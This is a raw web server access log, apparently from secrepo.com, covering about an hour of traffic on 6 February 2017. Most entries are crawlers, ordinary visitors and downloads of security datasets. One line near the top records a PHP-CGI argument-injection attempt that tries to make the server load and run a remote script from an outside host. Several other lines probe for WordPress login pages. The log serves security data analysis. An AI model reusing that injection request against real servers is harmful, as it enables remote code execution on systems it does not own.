163.172.65.42 - - [06/Feb/2017:01:46:00 -0800] "GET /self.logs/error.log.2015-09-09.gz HTTP/1.1" 200 812 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
104.199.181.39 - - [06/Feb/2017:01:48:35 -0800] "GET /?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://www.intecs.ru/sites/default/files/languages/30.txt HTTP/1.1" 200 34374 "-" "-" 
163.172.66.58 - - [06/Feb/2017:01:51:01 -0800] "GET /self.logs/access.log.2016-05-06.gz HTTP/1.1" 200 8420 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
80.76.204.144 - - [06/Feb/2017:01:54:57 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
80.76.204.144 - - [06/Feb/2017:01:54:57 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
80.76.204.144 - - [06/Feb/2017:01:54:57 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
80.76.204.144 - - [06/Feb/2017:01:54:58 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
157.55.39.53 - - [06/Feb/2017:01:59:16 -0800] "GET /self.logs/access.log.2015-01-18.gz HTTP/1.1" 200 3472 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
93.46.130.105 - - [06/Feb/2017:02:00:43 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" 
93.46.130.105 - - [06/Feb/2017:02:00:43 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" 
93.46.130.105 - - [06/Feb/2017:02:00:44 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" 
46.165.197.142 - - [06/Feb/2017:02:02:32 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://mj12bot.com/)" 
46.165.197.142 - - [06/Feb/2017:02:02:33 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://mj12bot.com/)" 
46.165.197.142 - - [06/Feb/2017:02:02:35 -0800] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://mj12bot.com/)" 
46.165.197.142 - - [06/Feb/2017:02:02:37 -0800] "GET / HTTP/1.1" 200 34318 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://mj12bot.com/)" 
157.55.39.53 - - [06/Feb/2017:02:08:52 -0800] "GET /self.logs/error.log.2015-08-01.gz HTTP/1.1" 200 707 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
80.170.142.133 - - [06/Feb/2017:02:11:10 -0800] "GET / HTTP/1.1" 200 10269 "https://t.co/hhp8zgb8EA" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:11:11 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:11:11 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:11:11 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
180.252.235.180 - - [06/Feb/2017:02:12:33 -0800] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
180.252.235.180 - - [06/Feb/2017:02:12:34 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
180.252.235.180 - - [06/Feb/2017:02:12:39 -0800] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
180.252.235.180 - - [06/Feb/2017:02:12:40 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
180.252.235.180 - - [06/Feb/2017:02:12:46 -0800] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
180.252.235.180 - - [06/Feb/2017:02:12:46 -0800] "GET / HTTP/1.1" 304 189 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
80.170.142.133 - - [06/Feb/2017:02:15:10 -0800] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:15:22 -0800] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:15:52 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629420 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:16:06 -0800] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 128116 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:16:16 -0800] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 1043378 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:16:31 -0800] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6908 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:16:43 -0800] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 200 182517 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:16:51 -0800] "GET /maccdc2012/ssl.log.gz HTTP/1.1" 200 1313675 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:17:03 -0800] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:17:47 -0800] "GET /tg/b.zip HTTP/1.1" 200 1357520 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:17:21 -0800] "GET /tg/a.zip HTTP/1.1" 200 66189337 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:18:44 -0800] "GET /tg/tg_snort_full.7z HTTP/1.1" 200 34080 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:18:04 -0800] "GET /tg/c.zip HTTP/1.1" 200 63359118 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:19:03 -0800] "GET /misc/zeus_dga_domains.txt.zip HTTP/1.1" 200 34080 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:18:26 -0800] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 4274093 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:19:23 -0800] "GET /domaindata/domainmovement.zip HTTP/1.1" 200 7437725 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:19:41 -0800] "GET /scada/scada_logs.zip HTTP/1.1" 200 364901 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:20:22 -0800] "GET /squid/access.log.gz HTTP/1.1" 200 4676346 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:20:57 -0800] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:20:37 -0800] "GET /squid/access.log.gz HTTP/1.1" 200 23177322 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
188.40.126.66 - - [06/Feb/2017:02:21:24 -0800] "GET / HTTP/1.1" 301 427 "-" "Mozilla/5.0 (compatible; NewShareCounts.com/1.0; +http://newsharecounts.com/crawler)" 
80.170.142.133 - - [06/Feb/2017:02:21:24 -0800] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631873 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:24:21 -0800] "GET /maccdc2012/maccdc2012_full_alert.7z HTTP/1.1" 200 24978942 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
80.170.142.133 - - [06/Feb/2017:02:24:53 -0800] "GET /maccdc2012/weird.log.gz HTTP/1.1" 200 1242777 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
111.248.198.13 - - [06/Feb/2017:02:26:01 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko)" 
80.170.142.133 - - [06/Feb/2017:02:26:07 -0800] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 51408672 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
42.236.158.223 - - [06/Feb/2017:02:32:29 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.1632.400 QQBrowser/9.5.9535.400" 
80.170.142.133 - - [06/Feb/2017:02:28:14 -0800] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 549098528 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
131.114.2.174 - - [06/Feb/2017:02:38:38 -0800] "GET / HTTP/1.1" 200 10269 "http://www.mlsecproject.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" 
131.114.2.174 - - [06/Feb/2017:02:38:38 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" 
131.114.2.174 - - [06/Feb/2017:02:38:38 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" 
131.114.2.174 - - [06/Feb/2017:02:38:39 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" 
186.251.88.62 - - [06/Feb/2017:02:39:34 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
186.251.88.62 - - [06/Feb/2017:02:39:35 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
186.251.88.62 - - [06/Feb/2017:02:39:35 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
186.251.88.62 - - [06/Feb/2017:02:39:37 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
186.251.88.62 - - [06/Feb/2017:02:40:12 -0800] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 128116 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
186.251.88.62 - - [06/Feb/2017:02:40:03 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 2153500 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
66.102.8.157 - - [06/Feb/2017:02:48:02 -0800] "GET / HTTP/1.1" 200 34374 "http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=0CEAQFjAD&url=http%3A%2F%2Fwww.secrepo.com%2F&ei=YlSYWLm8MfG41QTGZg&usg=AFQjCNHeQikQ6r63vtqWKlBvSenYpdB4dQ" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
66.102.8.128 - - [06/Feb/2017:02:48:02 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
66.102.8.157 - - [06/Feb/2017:02:48:02 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
66.102.8.128 - - [06/Feb/2017:02:48:02 -0800] "GET /tg/a.zip HTTP/1.1" 200 66189336 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
131.114.88.143 - - [06/Feb/2017:02:48:35 -0800] "GET / HTTP/1.1" 200 10269 "https://www.google.it/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0" 
131.114.88.143 - - [06/Feb/2017:02:48:35 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0" 
131.114.88.143 - - [06/Feb/2017:02:48:35 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0" 
131.114.88.143 - - [06/Feb/2017:02:48:35 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0" 
66.102.6.65 - - [06/Feb/2017:02:48:39 -0800] "GET /tg/a.zip HTTP/1.1" 200 66189337 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
40.77.167.39 - - [06/Feb/2017:02:48:53 -0800] "GET /self.logs/access.log.2016-06-25.gz HTTP/1.1" 200 5809 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
61.222.64.128 - - [06/Feb/2017:02:52:29 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
61.222.64.128 - - [06/Feb/2017:02:52:30 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
61.222.64.128 - - [06/Feb/2017:02:52:30 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
61.222.64.128 - - [06/Feb/2017:02:52:31 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
61.222.64.128 - - [06/Feb/2017:02:53:45 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.0" 200 6607269 "-" "Wget/1.12 (linux-gnu)" 
151.74.12.87 - - [06/Feb/2017:02:55:27 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
151.74.12.87 - - [06/Feb/2017:02:55:32 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
151.74.12.87 - - [06/Feb/2017:02:55:37 -0800] "GET / HTTP/1.1" 200 34374 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
163.172.66.121 - - [06/Feb/2017:02:55:43 -0800] "GET /self.logs/access.log.2017-01-17.gz HTTP/1.1" 200 18414 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
131.114.88.143 - - [06/Feb/2017:02:55:44 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0" 
131.114.88.143 - - [06/Feb/2017:02:55:45 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0" 
131.114.88.143 - - [06/Feb/2017:02:55:45 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0" 
109.26.216.163 - - [06/Feb/2017:02:47:12 -0800] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 549098528 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
